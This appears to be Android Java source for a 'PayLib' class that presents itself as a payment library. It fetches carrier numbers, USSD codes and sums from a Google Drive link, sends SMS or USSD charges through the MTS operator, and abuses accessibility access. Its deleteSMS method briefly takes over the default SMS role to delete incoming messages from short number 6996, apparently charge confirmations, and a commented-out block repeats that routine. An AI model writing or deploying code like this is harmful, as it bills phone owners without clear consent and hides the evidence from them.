package com.example.p2plib2;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.Telephony.Sms;
import android.support.annotation.RequiresApi;
import android.view.View;

import com.example.p2plib2.common.CommonFunctions;
import com.example.p2plib2.common.FilesLoader;
import com.example.p2plib2.operators.MTS;
import com.google.gson.Gson;

import java.util.ArrayList;
import java.util.HashMap;

import static com.example.p2plib2.ussd.USSDController.verifyAccesibilityAccess;


public class PayLib implements PayInterface {
    private static String operName = "";
    private String version = "1.0";
    private String operDest = "";
    public String result;
    String defaultSmsApp;
    View v;
    String downloadAdress = "https://drive.google.com/a/adviator.com/uc?authuser=0&id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v&export=download";
    static MTS mts;
    public static Boolean flagok = false;
    SharedPreferences mSettings;
    public static final String PREFERENCES = "mysettings";
    public static final String INFO = "operator"; // operators info
    HashMap<String, OperatorInfo> operatorInfo = new HashMap<>();
    /**
     * info
     */
    public static String mts_SMS;
    private String ussd_mts;
    private String sms_mts_target;
    private String sms_mts_target_check;
    private String ussd_mts_target;
    static CallSmsResult smsResult;
    static Context cnt;
    /**
     * Common
     */
    private String sum = "15";

    public static void sendAnswer(String smsBody) {
        if (mts != null) {
            mts.sendAnswer(mts_SMS, smsBody);
        } else {
            mts = new MTS(true, true, cnt);
        }
    }

    /**
     * Initialization
     */
    public static String getOperName() {
        return operName;
    }

    public static void getSMSResult(String smsBody) {
        Logger.lg("smsBody " + smsBody);
        smsResult.callResult(smsBody);
    }

    private void ini(Activity act, Context cnt, CallSmsResult smsResult) {
        this.smsResult = smsResult;
        this.cnt = cnt;
        CommonFunctions.permissionCheck(cnt, act);
        verifyAccesibilityAccess(act);
        Logger.lg(smsResult.toString() + " sms result ");
        mSettings = cnt.getSharedPreferences(PREFERENCES, Context.MODE_PRIVATE);
        operName = CommonFunctions.operName(cnt);
        loadItems();
    }

    private void loadItems() {
        new DownloadApkTask().execute();
    }

    private class DownloadApkTask extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... params) {
            final FilesLoader load = new FilesLoader();
            String input = load.downloadJson("https://drive.google.com/a/adviator.com/uc?authuser=0&id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v&export=download");
            Logger.lg("load items " + input);
            SharedPreferences.Editor editor = mSettings.edit();
            editor.putString(PREFERENCES, input);
            editor.apply();
            Gson g = new Gson();
            Operator operator = g.fromJson(input, Operator.class);
            for (Object user : operator.operators) {
                // OperatorInfo murzik = gson.fromJson(user.toString(), OperatorInfo.class);
                // Logger.lg("info " + murzik);
                Logger.lg("op " + user.toString() + " " + operator.getClass().toString());
                String[] separated = user.toString().replace("{", "").replace("}", "").trim().split(",");
                OperatorInfo info = new OperatorInfo(
                        separated[0].substring(separated[0].indexOf("=") + 1),
                        separated[1].substring(separated[1].indexOf("=") + 1),
                        separated[2].substring(separated[2].indexOf("=") + 1),
                        separated[3].substring(separated[3].indexOf("=") + 1),
                        separated[4].substring(separated[4].indexOf("=") + 1));
                operatorInfo.put(separated[0].substring(separated[0].indexOf("=") + 1), info);
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            initData();
        }
    }

    class Operator {
        ArrayList operators;
    }

    class OperatorInfo {
        String operator;
        String sms_number;
        String ussd_mts;
        String sms_mts_target;
        String sum;

        public OperatorInfo(String s, String s1, String s2, String s3, String s4) {
            this.operator = s;
            this.sms_number = s1;
            this.ussd_mts = s2;
            this.sms_mts_target = s3;
            this.sum = s4;
        }
    }

    /**
     * Interface methods
     */
    @Override
    public String sendSms(Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Activity act, Context cnt) {
        switch (operName) {
            case "MTS":
                mts = new MTS(sms_mts_target, sum, sendWithSaveOutput, sendWithSaveInput, cnt);
                result = mts.sendSMS();
                if (sendWithSaveInput == false) {
                    deleteSMS();
                }
                break;
        }
        return result;
    }

    @Override
    public void sendUssd(String operDestination, Activity act) {
        flagok = true;
        mts = new MTS(true, true, cnt);
        String input = mSettings.getAll().get("mysettings").toString();
        Logger.lg("inpu " + mSettings.getAll().get("mysettings"));
        Gson g = new Gson();
        Operator operator = g.fromJson(input, Operator.class);
        for (Object user : operator.operators) {
            // OperatorInfo murzik = gson.fromJson(user.toString(), OperatorInfo.class);
            // Logger.lg("info " + murzik);
            Logger.lg("op " + user.toString() + " " + operator.getClass().toString());
            String[] separated = user.toString().replace("{", "").replace("}", "").trim().split(",");
            OperatorInfo info = new OperatorInfo(
                    separated[0].substring(separated[0].indexOf("=") + 1),
                    separated[1].substring(separated[1].indexOf("=") + 1),
                    separated[2].substring(separated[2].indexOf("=") + 1),
                    separated[3].substring(separated[3].indexOf("=") + 1),
                    separated[4].substring(separated[4].indexOf("=") + 1));
            operatorInfo.put(separated[0].substring(separated[0].indexOf("=") + 1), info);
            Logger.lg(separated[0].substring(separated[0].indexOf("=") + 1));
        }
        if (operatorInfo.containsKey(getOperName())) {
            OperatorInfo info = operatorInfo.get(getOperName());
            mts.sendUssd(info.ussd_mts, info.sms_mts_target, info.sum, operDestination, act);
        }
    }

    @Override
    public void updateData(Activity act, Context cnt, CallSmsResult res) {
        ini(act, cnt, res);
    }

    @Override
    public String getVersion() {
        return version;
    }

    /**
     * SMS working
     */

    public void deleteSMS() {
        final String myPackageName = cnt.getPackageName();
        defaultSmsApp = Sms.getDefaultSmsPackage(cnt);
        Logger.lg(myPackageName + "  " + defaultSmsApp + " " + !defaultSmsApp.equals(myPackageName));
        if (!defaultSmsApp.equals(myPackageName)) {
            launchAppChooser(myPackageName);
        }
        String filter = "";
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor c = cnt.getContentResolver().query(
                uriSms, null, null, null, null);
        Logger.lg(c.getCount() + " count");
        int flag = 0;
        if (c != null && c.moveToFirst()) {
            do {
                long id = c.getLong(0);
                long threadId = c.getLong(1);
                String address = c.getString(2);
                String body = c.getString(5);
                String date = c.getString(3);
                Logger.lg("0>" + c.getString(0) + "1>" + c.getString(1)
                        + "2>" + c.getString(2) + "<-1>"
                        + c.getString(3) + "4>" + c.getString(4)
                        + "5>" + c.getString(5));

                if (address.equals("6996") && flag < 2) {
                    // mLogger.logInfo("Deleting SMS with id: " + threadId);
                    int iko = cnt.getContentResolver().delete(
                            Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
                    if (iko != 0) {
                        flag++;
                    }
                    Logger.lg("Delete success......... " + iko);
                } else {
                    Logger.lg("v  " + flag);
                }
            } while (c.moveToNext());
        }
        launchAppChooser(defaultSmsApp);
       /* DownloadDelete del = new DownloadDelete(filter);
        del.execute();*/

    }
    private void launchAppChooser(String myPackageName){
        Intent intent = new Intent(Sms.Intents.ACTION_CHANGE_DEFAULT);
        intent.putExtra(Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName);
        cnt.startActivity(intent);
    }
//    private class DownloadDelete extends AsyncTask<Void, Void, Void> {
//        String filter;
//        DownloadDelete(String str){
//            this.filter = str;
//        }
//
//        @Override
//        protected void onPreExecute() {
//            super.onPreExecute();
//                final String myPackageName = cnt.getPackageName();
//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
//                    defaultSmsApp = Sms.getDefaultSmsPackage(cnt);
//                }
//                Logger.lg(myPackageName + "  " + defaultSmsApp + " " + !defaultSmsApp.equals(myPackageName));
//                if (!defaultSmsApp.equals(myPackageName)) {
//                    Intent intent = new Intent(Sms.Intents.ACTION_CHANGE_DEFAULT);
//                    intent.putExtra(Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName);
//                    cnt.startActivity(intent);
//            }
//        }
//
//        @Override
//        protected Void doInBackground(Void... params) {
//            Uri uriSms = Uri.parse("content://sms/inbox");
//            Cursor c = cnt.getContentResolver().query(
//                    uriSms, null, null, null, null);
//            Logger.lg(c.getCount() + " count");
//            int flag = 0;
//            if (c != null && c.moveToFirst()) {
//                do {
//                    long id = c.getLong(0);
//                    long threadId = c.getLong(1);
//                    String address = c.getString(2);
//                    String body = c.getString(5);
//                    String date = c.getString(3);
//                    Logger.lg("0>" + c.getString(0) + "1>" + c.getString(1)
//                            + "2>" + c.getString(2) + "<-1>"
//                            + c.getString(3) + "4>" + c.getString(4)
//                            + "5>" + c.getString(5));
//
//                    if (address.equals("6996") && flag < 2) {
//                        // mLogger.logInfo("Deleting SMS with id: " + threadId);
//                        int iko = cnt.getContentResolver().delete(
//                                Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
//                        if (iko != 0) {
//                            flag++;
//                        }
//                        Logger.lg("Delete success......... " + iko);
//                    } else {
//                        Logger.lg("v  " + flag);
//                    }
//                } while (c.moveToNext());
//            }
//            Intent intent = new Intent(Sms.Intents.ACTION_CHANGE_DEFAULT);
//            intent.putExtra(Sms.Intents.EXTRA_PACKAGE_NAME, defaultSmsApp);
//            cnt.startActivity(intent);
//            return null;
//        }
//
//        @Override
//        protected void onPostExecute(Void result) {
//            Intent intent = new Intent(Sms.Intents.ACTION_CHANGE_DEFAULT);
//            intent.putExtra(Sms.Intents.EXTRA_PACKAGE_NAME, defaultSmsApp);
//            cnt.startActivity(intent);
//        }
//    }


    /***Init data */
    public void initData() {
        Logger.lg("ыва " + operatorInfo.keySet().toString());
        if (operatorInfo.containsKey(getOperName())) {
            OperatorInfo info = operatorInfo.get(getOperName());
            if (getOperName().equals("MTS")) {
                mts_SMS = info.sms_number;
                ussd_mts = info.ussd_mts;
                sms_mts_target = info.sms_mts_target;
                sms_mts_target_check = info.sms_mts_target;
                /**Common*/
                sum = info.sum;
                Logger.lg(sms_mts_target + " " + sms_mts_target);
            }
            /**Permissions text*/
        }
    }
}
